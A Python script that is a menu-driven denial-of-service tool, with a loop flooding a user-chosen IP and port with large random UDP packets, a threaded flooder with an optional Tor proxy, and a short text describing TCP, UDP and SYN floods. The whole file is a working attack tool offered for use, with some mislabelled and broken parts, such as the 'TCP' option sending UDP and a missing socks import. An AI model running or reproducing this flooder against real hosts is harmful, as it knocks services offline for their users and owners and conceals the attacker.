# Imports

import sys, socket, time, random, threading, pyfiglet, os
from datetime import datetime

#==========================
# Functions

def ABOUT():
	print("""

A Distributed Denial of Servie aka Ddos attack is a attack,

in which we flood the sevrer with so much requests that sevrer

becomes unavilable and it denials any coming service.


There are 3 major types of Ddos attack:- 
	
	[1] TCP Attack

	[2] UDP Attack

	[3] SYN Attack

	A Tcp attack is a attack in which we send TCP Packets to the server and flood
	the server. It is a Straight Forwad attack

	A UDP attack is a sessionless/connectionless computer networking protocol by
    which it floods the server in unsyncronized manner

    A SYN attack is a attack in which in which an attacker
    sends a succession of SYN requests to a target's system in an attempt to
    consume enough server resources to make the system unresponsive

		""")


def TCP():
	os.system("cls")
	msg = pyfiglet.figlet_format("TCP Attack")
	print(msg)
	bytes = random._urandom(65500)
	ip = input("Enter Ip of target: ")
	port = int(input("Enter Port: "))
	print ("[                    ] 0% ")
	time.sleep(5)
	print ("[=====               ] 25%")
	time.sleep(5)
	print ("[==========          ] 50%")
	time.sleep(5)
	print ("[===============     ] 75%")
	time.sleep(5)
	print ("[====================] 100%")
	time.sleep(3)
	sent = 0
	while True:
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sock.sendto(bytes, (ip, port))
		sent += 1
		print("[Success] {} packets send to {}".format(sent, ip))




def UDP():
	class DoS:
	    def __init__(self, host, port, nThreads, UseTor):
	        self.host = host
	        self.port = port
	        self.nThreads = nThreads
	        self.UseTor = UseTor
	        self.TPS = 0
	        self.Delimiter = 2000
	        self.message = os.urandom(65500)
	 
	        if self.UseTor:
	            socks.set_default_proxy(socks.SOCKS5, '127.0.0.1', 9150)
	 
	        self.threads = []
		 
	    def SendAttack(self):
	 
	        if self.UseTor:
	            s = socks.socksocket()
	            
	        else:
	            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	 
	        try:
	            s.connect((self.host, self.port))
	            s.send(self.message) # TCP Attack
	            s.sendto(self.message, (self.host, self.port)) # UDP Attack
	            self.TPS -= 1
	        except socket.error:
	            pass
	 
	        s.close()
	 
	    def Attack(self):
	 
	        for i in range(self.nThreads):
	            t = threading.Thread(target = self.SendAttack)
	            self.threads.append(t)
	 
	        for i in self.threads:
	            i.start()
	 
	            while self.TPS >= self.Delimiter:
	                pass
	 
	            self.TPS += 1
	 
	        for i in self.threads:
	            i.join()
	 
	os.system("cls") 
	message = pyfiglet.figlet_format("UDP Flood")
	print(message) 
	Tor = input('[?] Did you want to use Tor (S/N): ').lower()
	host = input('[*] Enter Target Host Address: ')
	port = int(input('[*] Enter Target Port to Attack: '))
	threads = int(input('[*] Enter number of Attacks: '))
	 
	UseTor = False
	 
	if Tor == 's':
	    UseTor = True
	 
	hostip = socket.gethostbyname(host)
	 
	DoS = DoS(host, port, threads, UseTor)
	 
	print('\nHost %s ... IP %s' % (host, hostip))
	print('\n\n[*] Starting The Attack At %s...' % (time.strftime("%H:%M:%S")))
	start_time = datetime.now()
	 
	DoS.Attack()
	 
	end_time = datetime.now()
	total_time = end_time - start_time
	 
	print('\n[*] The Attack Was Done At %s...' % (time.strftime("%H:%M:%S")))
	print('[*] Total Attack Time %s...' % (total_time))

#==================
# Designing

banner = pyfiglet.figlet_format("Ddos Attack")
print(banner)
print("""

	[1] TCP Attack
	[2] UDP Attack
	[3] About Attack

	Press Ctrl + C or Close terminal after attack \n because it will go into a loop and never end \n so you have to clase itmanually

""")

#=============================
# Choices
def choose():
	choice = int(input("Enter Choice: "))

	if choice == 1:
		TCP()
	elif choice == 2:
		UDP()
	elif choice == 3:
		ABOUT()
	else:
		print("[Error] Invalid Option..... Exiting")
		sys.exit()

choose()